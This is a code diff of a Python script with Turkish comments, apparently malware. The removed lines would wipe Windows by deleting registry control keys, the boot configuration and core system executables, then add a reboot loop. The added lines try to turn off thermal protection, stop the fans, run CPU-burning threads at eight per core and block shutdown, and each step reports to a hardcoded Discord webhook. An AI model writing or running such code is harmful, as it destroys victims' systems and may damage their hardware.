@@ -1,42 +1,133 @@
+import ctypes
+import time
+import multiprocessing
+import sys
+import threading
 import os
 import subprocess
-import time
+import requests
 
-# 1. Kayıt defterini boz
-try:
-    subprocess.run('reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control /f', shell=True)
-except:
-    pass
+# ==========================================
+# WEBHOOK BİLDİRİM URL'SI
+# ==========================================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
 
-# 2. BCD'yi boz
-try:
-    subprocess.run('bcdedit /delete {default} /f', shell=True)
-except:
-    pass
+def send_notification(message):
+    try:
+        payload = {"content": f"**[CPU YAK]** {message}"}
+        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+    except:
+        pass
 
-# 3. winlogon.exe'yi sil/taşı
-try:
-    os.rename("C:\\Windows\\System32\\winlogon.exe", "C:\\Windows\\System32\\winlogon.exe.bak")
-except:
-    pass
+# ==========================================
+# 1. TERMAL KORUMAYI KAPAT
+# ==========================================
+def disable_thermal():
+    try:
+        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True)
+        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True)
+        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True)
+        send_notification("🔥 Termal koruma kapatıldı!")
+    except Exception as e:
+        send_notification(f"❌ Termal koruma hatası: {e}")
 
-# 4. services.exe'yi sil
-try:
-    os.remove("C:\\Windows\\System32\\services.exe")
-except:
-    pass
+# ==========================================
+# 2. FANLARI DURDUR
+# ==========================================
+def stop_fans():
+    try:
+        import wmi
+        c = wmi.WMI()
+        for fan in c.Win32_Fan():
+            try:
+                fan.SetSpeed(0)
+                send_notification("🌀 Fan durduruldu!")
+            except:
+                pass
+    except:
+        pass
+    
+    try:
+        subprocess.run('speedfan.exe /P0', shell=True, capture_output=True)
+    except:
+        pass
+    
+    try:
+        subprocess.run('nvidia-smi -pl 50', shell=True, capture_output=True)
+    except:
+        pass
 
-# 5. LogonUI.exe'yi sil
-try:
-    os.remove("C:\\Windows\\System32\\LogonUI.exe")
-except:
-    pass
+# ==========================================
+# 3. CPU YAKICI (EN AĞIR)
+# ==========================================
+def cpu_killer():
+    while True:
+        # Matematik işlemleri
+        x = 3.14159
+        for _ in range(1000000):
+            x = x ** 1.00001
+            x = x / 1.000001
+            x = x * 0.999999
+            x = x + 0.000001
+        
+        # Bellek işlemleri
+        arr = [i ** i for i in range(5000)]
+        for _ in range(100):
+            arr.sort()
+            arr.reverse()
+        
+        # Rastgele işlemler
+        for _ in range(1000):
+            import random
+            random.random() * random.random()
 
-# 6. Sonsuz yeniden başlatma döngüsü (Task Scheduler)
-try:
-    subprocess.run('schtasks /create /tn "ShutdownLoop" /tr "shutdown /r /t 0" /sc onlogon /ru SYSTEM /rl HIGHEST /f', shell=True)
-except:
-    pass
+# ==========================================
+# 4. CPU ZORLAMA (8 KATI)
+# ==========================================
+def start_cpu_killer():
+    core_count = multiprocessing.cpu_count()
+    thread_count = core_count * 8  # 8 KATI
+    send_notification(f"🧠 Çekirdek: {core_count}, Açılacak thread: {thread_count}")
+    
+    for _ in range(thread_count):
+        threading.Thread(target=cpu_killer, daemon=True).start()
+    
+    send_notification(f"🔥 CPU %100 yüklendi ({thread_count} thread ile)")
 
-# 7. Bilgisayarı yeniden başlat
-os.system("shutdown /r /t 0")
+# ==========================================
+# 5. KAPANMAYI ENGELLE
+# ==========================================
+def prevent_shutdown():
+    while True:
+        try:
+            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
+        except:
+            pass
+        time.sleep(5)
+
+# ==========================================
+# 6. GÜÇ TUŞUNU İPTAL ET
+# ==========================================
+def prevent_power_button():
+    try:
+        ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
+        send_notification("🔌 Güç tuşu iptal edildi!")
+    except:
+        pass
+
+# ==========================================
+# 7. ANA
+# ==========================================
+if __name__ == "__main__":
+    send_notification("🚀 CPU YAKMA BAŞLATILDI!")
+    
+    disable_thermal()
+    stop_fans()
+    prevent_power_button()
+    start_cpu_killer()
+    threading.Thread(target=prevent_shutdown, daemon=True).start()
+    
+    send_notification("🔥 CPU 8 KATI THREAD İLE YANIYOR!")
+    
+    while True:
+        time.sleep(60)
